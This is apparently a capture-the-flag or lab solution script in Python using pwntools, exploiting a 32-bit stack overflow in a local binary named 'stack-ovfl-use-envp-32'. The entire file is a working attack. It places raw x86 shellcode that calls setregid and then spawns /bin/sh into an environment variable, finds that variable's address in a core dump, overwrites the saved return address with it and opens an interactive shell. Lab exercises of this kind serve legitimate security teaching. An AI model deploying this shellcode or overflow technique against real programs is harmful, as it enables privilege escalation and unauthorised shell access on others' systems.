#!/usr/bin/env python

from pwn import *

env = {
	"SHELLCODE":"j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"
}

p = process("./stack-ovfl-use-envp-32", env=env)
buffer = "abcdefghijklmnop"

c = Core("./core")
buffer += p32(c.stack.find("SHELLCODE")+10)

p.sendline(buffer)
p.interactive()
